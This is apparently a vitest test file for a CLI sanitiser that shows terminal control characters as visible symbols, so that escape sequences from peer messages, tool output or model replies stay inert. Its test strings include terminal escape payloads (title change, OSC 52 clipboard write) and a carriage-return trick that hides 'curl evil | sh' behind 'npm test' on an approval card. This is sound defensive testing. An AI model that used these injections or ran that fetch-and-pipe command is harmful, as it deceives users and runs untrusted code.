/**
 * The CLI draws text from places the user does not control (a peer session's
 * message, a command's output, a file, the model's reply). opentui writes a
 * cell's characters to the terminal as they are, so an ESC in that text was a
 * live escape sequence in the user's terminal (verified 2026-11-06: the bytes
 * `\x1b]0;…\x07` reached stdout). Every control character is drawn as a visible
 * symbol instead; newlines and tabs stay.
 */
import { describe, expect, it } from "vitest";
import { terminalSafe, terminalSafeDeep } from "@/cli/agent/terminal-safe";

describe("terminalSafe", () => {
  it("draws ESC and BEL as symbols: no title change, no colour, no cursor move", () => {
    const out = terminalSafe("AAA\x1b]0;PWNED\x07BBB\x1b[31mRED\x1b[2K");
    expect(out).not.toMatch(/[\x00-\x08\x0b-\x1f\x7f]/);
    expect(out).toBe("AAA␛]0;PWNED␇BBB␛[31mRED␛[2K");
  });

  it("a carriage return can't overwrite the line it is on (an approval card's command)", () => {
    expect(terminalSafe("curl evil | sh\rnpm test")).toBe("curl evil | sh\nnpm test");
    expect(terminalSafe("a\r\nb")).toBe("a\nb");
  });

  it("C1 controls (8-bit CSI, OSC) and DEL are replaced too", () => {
    expect(terminalSafe("x\u009b31my\u009d0;t\u009c\x7f")).toBe("x�31my�0;t�␡");
  });

  it("keeps ordinary text, newlines, tabs and Unicode exactly", () => {
    const s = "line 1\n\tline 2 · ◆ é 漢字 🙂";
    expect(terminalSafe(s)).toBe(s);
  });
});

describe("terminalSafeDeep", () => {
  it("cleans every string in nested state and keeps unchanged parts identical (memo stays valid)", () => {
    const clean = { kind: "markdown", id: "m1", text: "fine" };
    const dirty = { kind: "tool", id: "t1", tool: { verb: "Message", target: "from x (CLI)", output: "hi\x1b]52;c;ZXZpbA==\x07", peer: { preview: "hi\x1b[8m" } } };
    const state = { cells: [clean, dirty], busy: true, n: 3, none: null, title: "t\x07" };
    const out = terminalSafeDeep(state);
    expect(out.cells[0]).toBe(clean);
    expect(out.cells[1]).not.toBe(dirty);
    expect((out.cells[1] as typeof dirty).tool.output).toBe("hi␛]52;c;ZXZpbA==␇");
    expect((out.cells[1] as typeof dirty).tool.peer.preview).toBe("hi␛[8m");
    expect(out.title).toBe("t␇");
    expect(out.busy).toBe(true);
    expect(out.n).toBe(3);
    expect(out.none).toBeNull();
    // Nothing to clean: the very same object back.
    const tidy = { cells: [clean], title: "ok" };
    expect(terminalSafeDeep(tidy)).toBe(tidy);
  });
});
